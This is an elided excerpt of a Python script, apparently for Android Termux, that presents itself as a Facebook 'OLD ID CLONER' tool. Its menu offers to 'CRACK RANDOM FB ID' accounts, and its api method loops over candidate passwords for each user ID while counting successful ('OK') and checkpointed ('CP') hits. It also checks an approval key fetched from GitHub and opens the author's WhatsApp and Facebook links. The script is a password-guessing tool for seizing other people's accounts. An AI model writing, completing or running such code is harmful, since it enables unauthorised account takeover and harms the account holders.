...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Sarkar001/approval/blob/main/server.txt"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/sonu.prince.182")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +923155458723")
	subprocess.check_output(["am", "start", "https://wa.me/+923155458723"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/Sarkar001/text/main/Eid%201').text
			if basesplit in plr:
				key = basesplit
...
\033[1;93m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            KAL BATOO GA
     \033[1;96m➣ \033[1;92mGITHUB      :           KABII NHII BATOO GA
     \033[1;95m➣ \033[1;92mTOOLS      :            SUPER SPEED UID CLONE
\033[1;93m••••••••••••••••••••••••••••••••••••••••••••••••••••••••     
    """)
		print("%s [%s•%s] %sTOOL NAME : %sOLD  ID CLONER"%(G,R,G,B,G))
		...
		print("%s [%s2%s]%s CRACK RANDOM FB ID 2005-8 %s(PRO) V1"%(G,R,G,Y,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [❤CRACK] : %s/%s -> \033[0;92m [OK:%s ]- \033[0;93m[CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
